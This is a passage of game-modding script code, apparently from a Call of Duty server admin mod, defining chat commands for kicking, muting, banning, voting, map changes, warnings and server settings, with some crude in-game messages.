				systemSayAll("^5" + victim.name + "^1was killed by ^5" + self.name);
			}
			else	self systemSay("^1You cannot kill ^5" + victim.name + "^1.");
		}
		else	self systemSay("^1Could not find player^7: " + string);
	}
	else	self systemSay("^1You must supply a player name^7: !kill <player>");
}
killall()
{
	foreach(player in level.players)
		if(player.adminR.access < self.adminR.access && player != self)
			player suicide();
	systemSayAll("^1All players were killed by ^5" + self.name);
}
kills(argument)
{
	arg = strtok(argument, " ");
	victim = self;
	if(arg.size > 1)	victim = getPlayer(arg[ 0 ]);
	if(victim != level)
	{
		victim.kills = int(arg[ arg.size - 1 ]);
		victim.pers["kills"] = int(arg[ arg.size - 1 ]);
		self systemSay("^5" + victim.name + "^7's Kills set to: ^2" + int(arg[ arg.size - 1 ]));
	}
	else	self systemSay("^1Could not find player ^7: " + victim.name);
}
logg(string)
{
	log("[" + self.name + "]: " + string);
	self systemSay("^1Logged: ^7[" + self.name + "]: " + string);
}
mapz(string)
{
	console = "";
	name = "";
	if(string != "")
	{
		map = toLower(string);
		foreach(m in level.adminR.map)
			if(isSubStr(toLower(m.console), map) || isSubStr(toLower(m.name), map) || map == toLower(m.console) || map == toLower(m.name))
			{
				console = m.console;
				name = m.name;
			}
		if(console != "")
		{
			systemSayAll("^2Changing map to ^1" + name+ "^2...");
			setDvar("Roundcounter", 0);
			wait 1.5;
			map(console);
		}
		else	self systemSay("^1Could not find map:" + string);
	}
	else	self systemSay("^1You must supply a map: !map <map>");
}
maprestart()
{
	systemSayAll("^2Restarting map in...");
	wait 1.5;
	map(getDvar("mapname"));
}
maprotate()
{
	string = "";
	nextmap = "";
	list = strtok(getDvar("sv_mapRotation"), " ");
	foreach(map in list)
		if(map != ("map" || "gametype" || "arena" || "ctf" || "dd" || "dm" || "dom" || "gtnw" || "koth" || "oneflag" || "sab" || "sd" || "war"))	
			string += map + ";";
	maps = strtok(string, ";");
	for(i=0;i<maps.size;i++)
		if(getDvar("mapname") == maps[i])
			if(isDefined(maps[i+1]))	{
				nextmap = maps[i+1];
				break;
			}
			else	nextmap = maps[0];
	systemSayAll("^2Rotating map in...");
	wait 1;
	map(nextmap);
}
mask(argument)
{
	victim = self;
	arg = strtok(argument, " ");
	if(arg.size > 1)	victim = getPlayer(arg[ 0 ]);
	if(victim != level)
	{
		victim.adminR.mask = int(arg[ arg.size - 1 ]);
		self systemSay("^5" + victim.name + "^7 has been masked to ^2" + int(arg[ arg.size - 1 ]) + "^7 access");
	}
	else	self systemSay("^1Could not find player^7: " + arg[ 0 ]);
}
message(string)
{
	if(!isDefined(level.msgHUD))
	{
		level.msgHUD = level createServerFontString("hudsmall", 1);
		level.msgHUD setPoint("TOPLEFT", "TOPLEFT", 3, 110);
		level.msgHUD.HideWhenInMenu = true;
		level.msgHUD.foreground = true;
	}
	level.msgHUD setText(string);
}
mimic(argument)
{
	if(isDefined(argument))
	{
		arg = strtok(argument, " ");
		if(arg.size < 2)
			self systemSay("^1You must supply a message to use mimic^7: !mimic <player> <text>");
		else
		{
			victim = getPlayer(arg[ 0 ]);
			if(victim != level)
				victim sayAll(getSubStr(argument, arg[ 0 ].size + 1, argument.size));
			else	self systemSay("^1Could not find player^7: " + arg[ 0 ]);
		}
	}
	else	self systemSay("^1You must supply a player to mimic^7: !mimic <player> <text>");
}
mod(string)
{
	if(isDefined(string))
	{
		setDvar("fs_game", "mods/" + string);
		systemSayAll("^5" + self.name + "^7 set Mod to ^2" + string);
		systemSayAll("Mod will change upon restart");
	}
	else	self systemSay("^1You must supply a mod^7: !mod <mod name>");
}
mute(string)
{
	if(string != "")
	{
		victim = getPlayer(string);
		if(victim != level)
		{
			if(self.adminR.access > victim.adminR.access)
			{
				if(victim.adminR.muted)
				{
					victim.adminR.muted = false;
					self systemSay("^2Un-Muted^7: ^5" + victim.name);
					victim systemSay("^5" + self.name + "^7has ^2Un-Muted^7 you.");
				}
				else
				{
					victim.adminR.muted = true;
					self systemSay("^1Muted^7: ^5" + victim.name);
					victim systemSay("^5" + self.name + "^7has ^1Muted^7 you.");
				}
			}
			else self systemSay("^1You cannot mute ^5" + victim.name);
		}
		else	self systemSay("^1Could not find player^7: " + string);
	}
	else	self systemSay("^1You must supply a player^7: !mute <player>");
}
nextmap()
{
	string = "";
	nextmap = "";
	list = strtok(getDvar("sv_mapRotation"), " ");
	foreach(map in list)
		if(map != "map" && map != "gametype" && map != "arena" && map != "ctf" && map != "dd" && map != "dm" && map != "dom" && map != "gtnw" && map != "koth" && map != "oneflag" && map != "sab" && map != "sd" && map != "war")
			string += map + ";";
	maps = strtok(string, ";");
	for(i=0;i<maps.size;i++)
		if(getDvar("mapname") == maps[i])
			if(isDefined(maps[i+1]))	{
				nextmap = maps[i+1];
				break;
			}
			else	nextmap = maps[0];
			foreach(map in level.map)
				if(nextmap == map.console)
					self systemSay("Next map: ^2" + map.name);
}
origin(string)
{
	victim = self;
	if(isDefined(string))	victim = getPlayer(string);
	if(victim != level)
	{
		if(victim != self)
			self systemSay("^5" + victim.name + "^7's Origin: ^1" + victim.origin);
		else	self systemSay("Your Origin: ^1" + victim.origin);
	}
	else	self systemSay("^1Could not find player^7: " + string);
}
pm(argument)
{
	arg = strtok(argument, " ");
	victim = getPlayer(arg[ 0 ]);
	string = getSubStr(argument, arg[ 0 ].size + 1, argument.size);
	if(victim != level)
	{
		self systemSay("^0[^2PM^0] ^7to ^0[^5" + victim.name + "^0]^7: " + string);
		victim systemSay("^0[^2PM^0] ^7from ^0[^5" + self.name + "^0]^7: " + string);
	}
	else	self systemSay("^1Could not find player^7: " + arg[ 0 ]);
}
printt(string)	{	iPrintln(string);	}
printbold(string)	{	iPrintlnBold(string);	}
rage()
{
	self sayAll("^1I just rage quit, like a little bitch.");
	kick(self getEntityNumber());
}
rcon(argument)
{
	if(argument != "")
	{
		arg = strtok(argument, " ");
		if(arg.size > 1)
		{
			if(arg.size > 2)
			{
				string = getSubStr(argument, arg[0].size + 1, argument.size);
				setDvar(arg[0], string);
				self systemSay("Rcon: " + arg[0] + ", " + string);
			}
			else
			{
				setDvar(arg[0], arg[1]);
				self systemSay("Rcon: " + arg[0] + ", " + arg[1]);
			}
		}
		else self systemSay("Missing Value: !rcon <dvar> <value>");
	}
	else	self systemSay("Missing Dvar: !rcon <dvar> <value>");
}
rulez(int)
{
	i=1;
	if(!isDefined(int))
		foreach(rule in level.adminR.rule)
		{
			self systemSay("Rule " + i + ": " + rule);
			i++;
			wait 1;
		}
	else
	{
		if(isDefined(level.adminR.rule[int(int) - 1]))
			self systemSay("Rule " + int + ": " + level.adminR.rule[int(int) - 1]);
		else	self systemSay("^1Could not find Rule " + int);
	}
}
say(string)
{
	systemSayAll(string);
}
score(argument)
{
	arg = strtok(argument, " ");
	victim = self;
	if(arg.size > 1)	victim = getPlayer(arg[ 0 ]);
	if(victim != level)
	{
		victim.score = int(arg[ arg.size - 1 ]);
		victim.pers["score"] = int(arg[ arg.size - 1 ]);
		self systemSay("^5" + victim.name + "^7's Score set to: ^2" + int(arg[ arg.size - 1 ]));
	}
	else	self systemSay("^1Could not find player ^7: " + victim.name);
}
scorelimit(int)
{
	if(isDefined(int))
	{
		setDvar("scr_" + getDvar("g_gametype") + "_scorelimit", int(int));
		systemSayAll("^5" + self.name + "^7 set scorelimit to ^2" + int(int));
	}
	else	self systemSay("^1You must supply a scorelimit^7: !scorelimit <scorelimit>");
}
scream(string)
{
	if(isDefined(string))
	{
		for(i=0;i<7;i++)
		{
			systemSayAll("^" + i + string, 1);
			wait .8;
		}
	}
	else	self systemSay("^1You must supply a message^7: !scream <message>");
}
shock(string)
{
	if(isDefined(string))
	{
		victim = getPlayer(string);
		if(victim != level)
		{
			if(victim != self)
			{
				if(self.adminR.access > victim.adminR.access)
				{
					victim thread maps\mp\_radiation::radiationEffect();
					self systemSay("You Shocked ^5" + victim.name );
					victim systemSay("You were Shocked by ^5" + self.name);
				}
				else	self systemSay("^5" + victim.name + " ^1Owns you.");
			}
			else	self systemSay("^1You cannot use !shock on your self. Use !suicide");
		}
		else	self systemSay("^1Could not find player^7: " + string);
	}
	else	self systemSay("^1You must supply a player^7: !shock <player>");
}
shout(string)
{
	if(isDefined(string))
	{
		shout = spawnstruct();
		shout.titleText = string;
		shout.glowColor = (0,.4,.9);
		foreach(player in level.players)
			player thread maps\mp\gametypes\_hud_message::notifyMessage( shout );
	}
	else self systemSay("^1You must supply a message^7: !shout <message>");
}
space(string)
{
	if(isDefined(string))
	{
		victim = getPlayer(string);
		if(victim != level)
		{
			if(self.adminR.access > victim.adminR.access)
			{
				victim setOrigin(victim.origin+(0,0,1000));
				self systemSay("sent ^5" + victim.name + "^7 to space!");	
				victim systemSay(self.name + "sent you to space!");	
			}
			else	self systemSay("^5" + victim.name + " ^1Owns you.");
		}
		else	self systemSay("^1Could not find player^7: " + string);
	}
	else	self systemSay("^1You must supply a player^7: !space <player>");
}
spectator(string)
{
	victim = self;
	if(isDefined(string))	victim = getPlayer(string);
	if(victim != level)
	{
		if(!victim.adminR.spectating)
		{
			victim.adminR.prevteam = victim.team;
			victim thread forceteam(true, "spectator");
			victim.adminR.spectating = true;
			self systemSay("^5" + victim.name + "^7 is now spectating");
		}
		else
		{
			victim thread forceteam(true, victim.adminR.prevteam);
			victim.adminR.spectating = false;
			self systemSay("^5" + victim.name + "^7 is no longer spectating");
		}
	}
	else	self systemSay("^1Could not find player^7: " + string);
}
forceteam(spectate, team)
{
	self notify("menuresponse", game["menu_team"], team);
}
start(){}
status()
{
	self systemSay("This Server uses ^4Admin^0R^7");
	self systemSay("the latest Admin System for ^4R^0epZ");
}
suicidee()	{	self suicide();	}
teamchange(string)
{
	victim = self;
	if(isDefined(string))	victim = getPlayer(string);
	if(victim != level)
	{
		if(victim.team == "allies")	team = "axis";
		else	team = "allies";
		self systemSay("Changed ^5" + victim.name + "^7's Team");
		victim thread forceteam(false, team);
	}
	else self systemSay("^1Could not find player^7: " + string);
}
tempban(string)
{
	if(isDefined(string))
	{
		victim = getPlayer(string);
		if(victim == self)	self systemSay("^1You cannot ban yourself.");
		else
		{
			if(victim.adminR.access < self.adminR.access && victim != level)
			{
				kick(victim getEntityNumber());
				iprintln("^1" + victim.name + " has been banned until next map");
				banned(victim.name, victim.guid);
			}
			else	self systemSay("^1You cant ban ^5" + victim.name + "^1 he owns you bitch.");
		}
	}
	else self systemSay("^1You must supply a player name: !tempban <player>");
}
thirdperson()
{
	if(!self.adminR.third)
	{
		self setClientDvar("cg_thirdperson", 1);
		self.adminR.third = true;
	}
	else
	{
		self setClientDvar("cg_thirdperson", 0);
		self.adminR.third = false;
	}
}
timelimit(int)
{
	if(isDefined(int))
	{
		setDvar("scr_" + getDvar("g_gametype") + "_timelimit", int(int));
		systemSayAll("^5" + self.name + "^7 Set the timelimit to ^2" + int(int));
	}
	else self systemSay("^1You must supply a timelimit^7: !timelimit <timelimit>");
}
toadmins(string)
{
	foreach(player in level.players)
		if(player.adminR.access > 0 && player != self)
			player systemSay("^0[^1APM^0] ^7from ^0[^5" + self.name + "^0]^7: " + string);
	self systemSay("^0[^1APM^0] ^7to Admins: " + string);
}
use(string)
{
	if(isDefined(string))
	{
		string = "Could not find command: " + string;
		foreach(cmd in level.adminR.cmd)
			foreach(alias in cmd.alias)
				if(string == alias)
					string = "^3Use^7: " + cmd.use;
		self systemSay(string);
	}
	else	self systemSay("^1You must supply a command: !use <command>");
}
veto()
{
	if(level.adminR.voting)
	{
		level thread resetVote();
		systemSayAll("^5" + self.name + "^7 Vetoed the vote");
	}
	else self systemSay("^3Vote: ^1There are currently no votes in progress.");	
}
resetVote()
{
	level notify("vote_veto");
	level.msgHUD setText(level.adminR.oldtext);
	level.adminR.voting = false;
	level.adminR.voteno = 0;
	level.adminR.voteyes = 0;
	foreach(player in level.players)
		player.adminR.voted = false;
}
votekick(string)
{
	level endon("vote_veto");
	if(!level.adminR.voting)
	{
		if(isDefined(string))
		{
			victim = getPlayer(string);
			if(victim != level)
			{
				level.adminR.voting = true;
				systemSayAll("^3Vote^7: ^1Kick has started, kick: ^5" + victim.name + "^1?");
				systemSayAll("^3Vote^7: ^1Vote yes using !vy / !y / !yes / !voteyes ^3  |  ^2Vote no using !vn / !n / !no / !voteno");
				if(isDefined(level.msgHUD.text))
					level.adminR.oldtext = level.msgHUD.text;
				else	level.adminR.oldtext = "";
				time = 30;
				for(;;)
				{
					if(time == 0)
					{
						systemSayAll("^3Vote^7: ^1Yes^3: ^1" + level.adminR.yes + "  ^3|  ^2No^3: ^2" + level.adminR.no);
						if(level.adminR.yes > level.adminR.no)
						{
							kick(victim getEntityNumber(), "EXE_PLAYERKICKED");
							systemSayAll("^3Vote: ^5" + victim.name + "^1 has been kicked.");
						}
						else	systemSayAll("^3Vote^7: ended^3, ^5" + victim.name + "^7 has not been kicked.");
						level thread resetVote();
					}
					else
					{
						level thread message("^3Vote: ^1Kick ^5" + victim.name + "^1? ^3:^1 " + time);
						wait 1;
						time--;
					}
				}
			}
			else	self systemSay("^1Could not find player: ^5" + string);
		}
		else self systemSay("^1You must supply a player^7: !votekick <player>");
	}
	else	self systemSay("^1There is already a vote in progress, please wait until the current vote is finished.");
}
votemap(string)
{
	level endon("vote_veto");
	if(!level.adminR.voting)
	{
		map = undefined;
		if(string == "")
			self systemSay("^1You must supply a map, !votemap <!map>");
		else
		{
			foreach(m in level.adminR.map)
				if(isSubStr(m.console, toLower(string)) || isSubStr(m.name, toLower(string)) || toLower(string) == ( m.console || m.name ))
					map = m;
			if(isDefined(map))
			{
				level.adminR.voting = true;
				systemSayAll("^3Vote^7: Change map to: ^3" + map.name + "^3?");
				systemSayAll("^3Vote^7: ^1Vote yes using !vy / !y / !yes / !voteyes ^3  |  ^2Vote no using !vn / !n / !no / !voteno");
				if(isDefined(level.msgHUD.text))
				level.adminR.oldtext = level.msgHUD.text;
				else	level.adminR.oldtext = "";
				time = 30;
				for(;;)
				{
					if(time == 0)
					{
						systemSayAll("^3Vote^7: ^2Yes^3: ^2" + level.adminR.yes + "  ^3|  ^1No^3: ^1" + level.adminR.no);
						if(level.adminR.yes > level.adminR.no)
						{
							systemSayAll("^3Vote^7: Map changing to: ^3" + map.name + " ^7in: ^33");
							wait 1;
							systemSayAll("^3Vote^7: Map changing to: ^3" + map.name + " ^7in: ^32");
							wait 1;
							systemSayAll("^3Vote^7: Map changing to: ^3" + map.name + " ^7in: ^31");
							wait 1;
							map(map.console);
						}
						else	systemSayAll("^3Vote^7: ended^3, ^7map will not change");
						level thread resetVote();
					}
					else
					{
						level thread message("^3Vote^7: Change map to: ^3" +  map.name + "^3? ^7: ^3" + time);
						wait 1;
						time--;
					}
				}
			}
			else	self systemSay("^1Could not find map^7: " + string);
		}
	}
	else	self systemSay("^1There is already a vote in progress, please wait until the current vote is finished.");
}
voteno()
{
	self thread playerVote("No");
}
voteyes()
{
	self thread playerVote("Yes");
}
playerVote(vote)
{
	if(level.adminR.voting)
	{
		if(!self.adminR.voted)
		{
			if(vote == "Yes")
			{
				level.adminR.yes++;
				self systemSay("^3Vote^7: You have voted ^3Yes");
			}
			if(vote == "No")
			{
				level.adminR.no++;
				self systemSay("^3Vote^7: You have voted ^3No");
			}
			self.adminR.voted = true;
		}
		else	self systemSay("^3Vote: ^1You have already voted.");
	}
	else	self systemSay("^3Vote: ^1There are currently no votes in progress.");
}
warn(argument)
{
	if(isDefined(argument))
	{
		arg = strtok(argument, " ");
		victim = getPlayer(arg[ 0 ]);
		if(victim != self)
		{
			if(victim != level)
			{
				if(self.adminR.access > victim.adminR.access)
				{
					string = undefined;
					if(arg.size > 1)	string = getSubStr(argument, arg[ 0 ] + 1, argument.size);
					victim.adminR.warnings++;
					if(isDefined(string))
						systemSayAll("^1Warning ^0[^7 " + victim.adminR.warnings + " ^0] ^1" + victim.name + " ^7" + string );
					else	systemSayAll("^1Warning ^0[^7 " + victim.adminR.warnings + " ^0] ^1" + victim.name);
					if(victim.adminR.warnings > 2)
					{
						systemSayAll("^1" + victim.name + "^7 Will be automatically kicked in 10 seconds", 1.5);
						wait 10;
						if(victim.adminR.warnings > 2)
							kick(victim getEntityNumber(), "EXE_PLAYERKICKED");	
					}
				}
				else	self systemSay("^1You cannot warn ^5" + victim.name + "^1.");
			}
			else	self systemSay("^1Could not find player^7: " + arg[ 0 ]);
		}
		else	self systemSay("^1You cannot warn yourself.");
	}
	else self systemSay("^1You must supply a player name: !warn <player> (<reason>)");
}
warnclear(string)
{
	if(isDefined(string))
	{
		victim = getPlayer(string);
		if(victim != level)
		{
			victim.adminR.warnings = 0;
			systemSayAll("All Warnings Cleared for ^5" + victim.name);
		}
		else	self systemSay("^1Could not find player^7: " + string);
	}
	else	self systemSay("^1You must supply a player name: !warnclear <player>");
}
warnremove(string)
{
	if(isDefined(string))
	{
		victim = getPlayer(string);
		if(victim != level)
		{
			if(victim.adminR.warnings > 0)
			{
				victim.adminR.warnings--;
				systemSayAll("Last warning for ^5" + victim.name + "^7 has been removed");
			}
			else	self systemSay("^5" + victim.name + "^7 has no warnings");
		}
		else	self systemSay("^1Could not find player^7: " + string);
	}
	else	self systemSay("^1You must supply a player name: !warnremove <player>");
}
xfps()
{
	dvar = "fx_enable;cg_blood;cg_brass;cl_maxpackets;fx_marks;fx_marks;fx_marks_ents;fx_marks_smodels;fx_drawclouds;r_fullbright;";
	dvar += "r_altModelLightingUpdate;r_dlightLimit;r_drawSun;r_drawWater;r_fastSkin;r_multiGpu;r_vsync;r_texFilterAnisoMax;sm_maxLights";
	vars = strtok(dvar, ";");
	if(!self.adminR.xfps)
	{
		vals = strtok("0;0;0;100;0;0;0;0;1;1;0;0;0;1;1;0;1;0",";");
		self.adminR.xfps = true;
		self.adminR.fps = true;
		self systemSay("Extra FPS Enabled");
	}
	else
	{
		vals = strtok("1;1;1;30;1;1;1;1;0;0;4;1;1;1;0;1;16;4",";");
		self.adminR.xfps = false;
		self.adminR.fps = true;
		self systemSay("Extra FPS Disabled");
	}
	for(i=0;i<vars.size;i++)
		self setClientDvar(vars[i], int(vals[i]));
}